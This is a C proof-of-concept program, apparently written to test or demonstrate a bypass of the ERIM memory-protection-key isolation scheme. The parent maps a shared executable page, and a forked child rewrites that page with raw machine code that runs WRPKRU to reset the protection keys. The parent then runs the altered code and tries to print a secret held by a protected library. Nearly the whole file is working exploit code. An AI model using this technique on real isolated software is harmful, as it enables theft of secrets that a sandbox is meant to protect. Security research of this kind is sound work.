#define _LARGEFILE64_SOURCE /* See feature_test_macros(7) */
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <erim.h>
#include <timer.h>
#include "secure_lib.h"


int main(int argc, char **argv) {
    secure_lib_init();
    secure_lib_print_secret();

    unsigned char buf1[4096] = {
        0xc3, // ret
        0
    };

    void *page = mmap(0x100000000, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, 0, 0);
    *(int*)page = 0xc3;

    mprotect(page, 4096, PROT_READ|PROT_EXEC);

    void (*fun_ptr)(void) = page;
    fun_ptr();

    pid_t pid = fork();

    if (pid == 0) {
        mprotect(page, 4096, PROT_READ|PROT_WRITE);
        
        unsigned char buf2[4096] = {
            0x50, 0x52, 0x51, // push rax, rdx, rcx
            0x31, 0xc9,  // xor ecx, ecx
            0x31, 0xd2,  // xor edx, edx
            0xb8, 0x50, 0x55, 0x55, 0x55, // mov eax,0x55555550
            0x0f, 0x01, 0xef, // wrpku
            0x59, 0x5a, 0x58, // pop rcx, rdx, rax
            0xc3, // ret
            0
        };

        memcpy(page, buf2, 20);
        msync(page, 4096, MS_SYNC|MS_INVALIDATE);


    } else {

        int status;
        waitpid(pid, &status, 0);
        fun_ptr();

        fprintf(stderr, "TRYING TO STEAL THE SECRET: %s\n", secure_lib_secret);

        return 0;
    }
}
